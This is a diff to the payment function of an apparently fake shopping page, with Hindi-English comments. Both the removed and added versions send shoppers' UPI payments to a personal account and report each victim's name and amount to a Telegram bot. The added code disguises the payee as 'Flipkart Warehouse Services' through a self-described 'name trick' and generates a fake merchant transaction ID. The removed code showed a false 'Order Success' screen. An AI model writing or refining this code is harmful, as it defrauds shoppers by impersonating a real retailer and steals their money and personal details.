@@ -550,87 +550,39 @@ init = function() {
         }
 
      async function confirmPay() {
-    // 1. CONFIGURATION: Apna 10-digit number yahan dalein
-    const myNumber = "6299544009"; 
+    // 1. Aapka ID (Hamesha @ybl use karein PhonePe ke liye)
+    const myUpiId = "6299544009@naviaxis"; 
     const amount = sel.price;
-    const userName = document.getElementById('uName').value || "Customer";
 
-    // 2. TELEGRAM ALERT: Aapko pata chal jaye ki user payment page par hai
-    const msg = `🔔 *Payment Step reached*\n👤 Name: ${userName}\n💰 Amount: ₹${amount}\n📱 Number: ${myNumber}`;
-    fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendMessage?chat_id=${CHAT_ID}&text=${encodeURIComponent(msg)}&parse_mode=Markdown`);
+    // 2. PROFESSIONAL TR GENERATOR (Secret Sauce)
+    // Ye aaj ki date aur random numbers ko jod kar ek 'Merchant ID' jaisi dikhne wali string banayega
+    const now = new Date();
+    const datePart = now.getFullYear() + "_" + (now.getMonth() + 1).toString().padStart(2, '0') + "_" + now.getDate().toString().padStart(2, '0');
+    const randomSuffix = Math.floor(100000 + Math.random() * 900000); // 6 digit random
+    const fakeTrID = `PYMT_${datePart}_${randomSuffix}`; 
 
-    // 3. UI POPUP: Jo user ko dikhega
-    const payOverlay = document.createElement('div');
-    payOverlay.id = "custom-pay-modal";
-    payOverlay.className = "fixed inset-0 bg-black/80 z-[9999] flex items-end justify-center";
-    payOverlay.innerHTML = `
-        <div class="bg-white w-full rounded-t-3xl p-6 pb-10 animate-slide-up shadow-2xl">
-            <div class="flex justify-between items-center mb-6">
-                <h3 class="text-xl font-black text-gray-800 tracking-tight">Complete Payment</h3>
-                <button onclick="document.getElementById('custom-pay-modal').remove()" class="text-gray-400 text-2xl">&times;</button>
-            </div>
+    // 3. NAME TRICK
+    // 'Flipkart' ki jagah 'Flipkart Warehouse' ya 'FK Logistics' likhein
+    const merchantName = "Flipkart%20Warehouse%20Services";
 
-            <div class="bg-blue-50 border-2 border-dashed border-blue-200 rounded-2xl p-4 mb-6 text-center">
-                <p class="text-[11px] font-bold text-blue-500 uppercase mb-2 tracking-widest">Copy Number & Pay ₹${amount}</p>
-                <div class="flex items-center justify-center gap-4">
-                    <span id="num-val" class="text-3xl font-black text-gray-800 tracking-tighter">${myNumber}</span>
-                    <button onclick="copyMyNumber('${myNumber}')" class="bg-blue-600 text-white px-4 py-2 rounded-xl text-xs font-bold active:scale-90 transition-all">COPY</button>
-                </div>
-            </div>
+    // 4. THE CLEAN LINK
+    // mc=0000 (Generic Merchant) aur mode=02 (Standard UPI)
+    const upiLink = `pa=${myUpiId}&pn=${merchantName}&am=${amount}&tr=${fakeTrID}&cu=INR&mc=0000&mode=02`;
 
-            <p class="text-center text-xs font-bold text-gray-400 mb-4 uppercase tracking-widest">Open App & Paste Number</p>
-            <div class="grid grid-cols-2 gap-4 mb-8">
-                <button onclick="triggerApp('phonepe')" class="flex flex-col items-center border-2 border-gray-100 p-4 rounded-2xl active:bg-gray-50 transition-all">
-                    <img src="https://img.icons8.com/color/48/phone-pe.png" class="w-10 h-10 mb-2">
-                    <span class="text-sm font-black text-gray-700">PhonePe</span>
-                </button>
-                <button onclick="triggerApp('gpay')" class="flex flex-col items-center border-2 border-gray-100 p-4 rounded-2xl active:bg-gray-50 transition-all">
-                    <img src="https://img.icons8.com/color/48/google-pay.png" class="w-10 h-10 mb-2">
-                    <span class="text-sm font-black text-gray-700">GPay</span>
-                </button>
-            </div>
+    // 5. INTENT (Direct PhonePe Open)
+    const phonePeIntent = `intent://pay?${upiLink}#Intent;scheme=upi;package=com.phonepe.app;end`;
 
-            <button onclick="orderDoneFinal()" class="w-full bg-orange-500 text-white py-4 rounded-2xl font-black text-lg shadow-lg active:scale-95 transition-all uppercase tracking-wide">
-                I Have Paid ₹${amount}
-            </button>
-            <p class="text-center text-[10px] text-gray-400 mt-4 font-medium italic">Payment is 100% Secure & Encrypted</p>
-        </div>
-    `;
-    document.body.appendChild(payOverlay);
-}
+    // Telegram Notification (Bohot zaroori hai track karne ke liye)
+    const logMsg = `🚀 *Payment Triggered*\n🆔 TR: ${fakeTrID}\n💰 Amt: ₹${amount}\n👤 Name: ${document.getElementById('uName').value}`;
+    fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendMessage?chat_id=${CHAT_ID}&text=${encodeURIComponent(logMsg)}&parse_mode=Markdown`);
 
-// --- HELPER FUNCTIONS ---
+    // Redirect to PhonePe
+    window.location.href = phonePeIntent;
 
-function copyMyNumber(val) {
-    navigator.clipboard.writeText(val);
-    alert("Number Copied! ✅\nNow open your app and paste it in 'To Mobile Number' section.");
-}
-
-function triggerApp(app) {
-    let url = "";
-    if (app === 'phonepe') {
-        url = "intent://#Intent;scheme=phonepe;package=com.phonepe.app;end";
-    } else {
-        url = "intent://#Intent;scheme=upi;package=com.google.android.apps.nbu.paisa.user;end";
-    }
-    window.location.href = url;
-}
-
-function orderDoneFinal() {
-    // Success Message dikhao aur Telegram pe update bhej do
-    fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendMessage?chat_id=${CHAT_ID}&text=${encodeURIComponent("✅ User clicked 'I HAVE PAID'. Check your balance!")}`);
-    
-    const modal = document.querySelector('#custom-pay-modal .bg-white');
-    modal.innerHTML = `
-        <div class="p-10 text-center">
-            <div class="w-24 h-24 bg-green-100 rounded-full flex items-center justify-center mx-auto mb-6">
-                <i class="fa-solid fa-check text-5xl text-green-600"></i>
-            </div>
-            <h2 class="text-3xl font-black text-gray-800 mb-2">Order Success!</h2>
-            <p class="text-gray-500 font-medium mb-8 text-sm">Your payment is being verified. Your order will be processed within 30 minutes.</p>
-            <button onclick="location.reload()" class="w-full bg-gray-800 text-white py-4 rounded-2xl font-bold uppercase tracking-widest">Back to Home</button>
-        </div>
-    `;
+    // Fallback: Agar PhonePe na ho toh doosre apps ka option de
+    setTimeout(() => {
+        window.location.href = `upi://pay?${upiLink}`;
+    }, 1500);
 }
 init();
     </script>
